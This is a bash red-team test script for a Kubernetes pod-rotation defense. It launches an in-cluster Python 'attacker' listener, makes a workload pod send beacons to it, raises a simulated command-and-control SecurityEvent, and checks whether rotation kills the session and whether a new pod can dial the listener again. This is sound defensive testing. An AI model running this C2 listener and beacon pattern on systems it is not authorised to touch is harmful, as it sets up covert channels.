#!/usr/bin/env bash
# gp7c.sh — GP7 airtight version: in-cluster "attacker" listener pod (cached python:3.11-slim
# image, zero pulls), bot beacons to it, rotate kills the session, new pod re-dials = BOUND.
set -uo pipefail
NSV=voice; NSX=phorvex-system; CTRL=phorvex-phorvex
OUT=/tmp/px-gp7c; mkdir -p "$OUT"

kubectl run gp7-listener -n $NSV --image=python:3.11-slim --restart=Never --overrides='{"spec":{"imagePullSecrets":[],"containers":[{"name":"gp7-listener","image":"python:3.11-slim","imagePullPolicy":"IfNotPresent","command":["python3","-c","import socket,threading,time\nsrv=socket.socket();srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\nsrv.bind((\"0.0.0.0\",9099));srv.listen(4)\nprint(\"listening\",flush=True)\ndef h(c,a):\n    while True:\n        try:d=c.recv(256)\n        except Exception:break\n        if not d:break\n        print(time.strftime(\"%H:%M:%S\"),a,d.decode().strip(),flush=True)\n    print(time.strftime(\"%H:%M:%S\"),a,\"CLOSED\",flush=True)\nwhile True:\n    c,a=srv.accept();print(time.strftime(\"%H:%M:%S\"),a,\"CONNECTED\",flush=True)\n    threading.Thread(target=h,args=(c,a),daemon=True).start()"]}]}}' >/dev/null
kubectl wait -n $NSV --for=condition=Ready pod/gp7-listener --timeout=120s >/dev/null
LIP=$(kubectl get pod -n $NSV gp7-listener -o jsonpath='{.status.podIP}')
echo "attacker listener pod: $LIP:9099"

BOT=$(kubectl get pods -n $NSV --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')
echo "beacon source: $BOT"
kubectl exec -n $NSV $BOT -- python3 -c "
import socket, time
s = socket.create_connection(('$LIP', 9099), timeout=8)
for i in range(60):
    try: s.sendall(b'beacon seq=%d\n' % i)
    except Exception: print('beacon died', flush=True); break
    time.sleep(2)
" &
sleep 5
echo "-- listener before event:"; kubectl logs -n $NSV gp7-listener | tail -3 | tee "$OUT/before.txt"

T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
kubectl apply -f - <<EOF
apiVersion: amtd.r6security.com/v1beta1
kind: SecurityEvent
metadata:
  name: gp7-c2-incluster
spec:
  rule:
    type: CommandAndControl
    threatLevel: critical
    source: redteam
  targets:
    - $NSV/$BOT
  description: "GP7 in-cluster: live beacon, detector fires, rotate must kill the session"
  anomalyScore: "0.97"
EOF
for i in $(seq 1 15); do
  sleep 5
  D=$(kubectl logs -n $NSX deploy/$CTRL --since-time="$T0" 2>/dev/null | grep "$BOT" | grep -i "rotate" | tail -1)
  [ -n "$D" ] && { echo "$D" | head -c 400; echo; break; }
  echo "  ...waiting ($i)"
done
sleep 6
echo "-- listener after rotate (expect CLOSED — the session died with the pod):"; kubectl logs -n $NSV gp7-listener | tail -3 | tee "$OUT/after.txt"
kubectl delete securityevent gp7-c2-incluster --ignore-not-found

echo "-- re-dial from the replacement/peer pod (BOUND: reachability is unchanged):"
kubectl wait -n $NSV --for=condition=Ready pod -l app=voice-bot --timeout=180s >/dev/null 2>&1
NEWBOT=$(kubectl get pods -n $NSV --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n $NSV $NEWBOT -- python3 -c "
import socket; s = socket.create_connection(('$LIP', 9099), timeout=8)
s.sendall(b'beacon RE-ESTABLISHED post-rotate\n'); print('re-dialed OK from', socket.gethostname())"
sleep 1; kubectl logs -n $NSV gp7-listener | tail -2 | tee "$OUT/redial.txt"

kubectl delete pod -n $NSV gp7-listener --wait=false
kubectl get pods -n $NSV | grep -v gp7-listener | tee "$OUT/pods-after.txt"
echo done
